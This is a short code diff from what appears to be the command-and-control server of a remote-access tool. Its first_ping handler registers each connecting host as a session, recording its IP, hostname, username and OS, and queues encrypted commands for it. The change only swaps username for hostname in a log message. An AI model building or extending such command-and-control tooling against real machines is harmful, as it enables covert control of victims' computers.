@@ -320,7 +320,7 @@ def first_ping():
             ip = request.environ['REMOTE_ADDR']
             last_ping = time.ctime()
             connections_information[counter] = [counter, ip, hostname, pid, username, domain, last_ping, os_version]
-            print("\n\x1b[6;30;42m new connection \x1b[0m from %s (%s) as session %s" %(username, ip, counter))
+            print("\n\x1b[6;30;42m new connection \x1b[0m from %s (%s) as session %s" %(hostname, ip, counter))
             commands[hostname] = encrypt_command(aes_key, aes_iv, "False")
             counter = counter + 1
             response = make_response("")
